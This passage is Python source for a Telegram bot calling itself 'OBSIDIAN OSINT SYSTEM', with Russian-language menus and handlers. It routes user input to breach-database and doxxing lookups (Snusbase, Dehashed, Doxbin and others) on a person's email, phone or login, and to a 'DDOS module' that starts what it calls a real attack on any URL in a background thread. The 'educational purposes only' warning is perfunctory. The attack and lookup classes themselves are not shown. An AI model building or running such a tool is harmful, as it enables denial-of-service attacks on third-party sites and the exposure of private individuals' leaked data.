                "Пример: 55.7558, 37.6173\n\n"
                "Будет получено:\n"
                "- Адрес\n"
                "- Ближайшие места\n"
                "- Часовой пояс\n"
                "- Высота\n"
                "- Погода",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'geo'
        
        elif data == "leaks":
            await query.edit_message_text(
                "💀 **Поиск по базам данных**\n\n"
                "Введи email, номер или логин:\n\n"
                "Проверка в базах:\n"
                "- LeakCheck\n"
                "- Snusbase\n"
                "- Dehashed\n"
                "- Scylla\n"
                "- Doxbin\n"
                "- Pastebin\n"
                "- Утечки крупных сервисов",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'leaks'
        
        elif data == "shodan":
            await query.edit_message_text(
                "🔍 **Shodan**\n\n"
                "Введи IP или поисковый запрос:\n"
                "Пример: 8.8.8.8\n\n"
                "Будет получено:\n"
                "- Открытые порты\n"
                "- Уязвимости\n"
                "- Организация\n"
                "- Данные устройств",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'shodan'
        
        elif data == "whois":
            await query.edit_message_text(
                "📋 **WHOIS**\n\n"
                "Введи домен или IP:\n"
                "Пример: google.com\n\n"
                "Будет получено:\n"
                "- Регистратор\n"
                "- Даты\n"
                "- DNS\n"
                "- Контакты",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'whois'
        
        elif data == "ddos":
            await query.edit_message_text(
                "💥 **DDOS МОДУЛЬ**\n\n"
                "Введи цель (URL):\n"
                "Пример: http://example.com\n\n"
                "⚠️ НАСТОЯЩАЯ АТАКА!\n"
                "Используй только в образовательных целях\n"
                "За это может грозить уголовная ответственность",
                parse_mode='Markdown'
            )
            context.user_data['mode'] = 'ddos'
    
    async def handle_message(self, update: Update, context):
        """Обработка сообщений"""
        text = update.message.text
        mode = context.user_data.get('mode', '')
        
        if mode == 'email':
            result = EmailOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'phone':
            result = PhoneOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'ip':
            result = IPOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'domain':
            result = DomainOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'social':
            result = SocialOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'geo':
            try:
                lat, lon = map(float, text.split(','))
                result = GeoOSINT(lat, lon).search_all()
                await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
            except:
                await update.message.reply_text("❌ Неверный формат. Используй: 55.7558, 37.6173")
        
        elif mode == 'leaks':
            result = LeakOSINT(text).search_all()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'shodan':
            result = ShodanOSINT().search(text)
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'whois':
            result = WhoisOSINT(text).search()
            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
        
        elif mode == 'ddos':
            ddos = DDOSModule(text)
            await update.message.reply_text("💥 Запуск DDOS-атаки...")
            threading.Thread(target=ddos.start_attack).start()
            await update.message.reply_text("⚡ Атака запущена! Используй /stopddos для остановки")
            context.user_data['ddos'] = ddos
    
    def run(self):
        """Запуск бота"""
        print("⚫ OBSIDIAN OSINT SYSTEM запущен")
        self.app.run_polling()

# ================================================================
# ЗАПУСК
# ================================================================
if __name__ == "__main__":
    bot = ObsidianBot()
    bot.run()
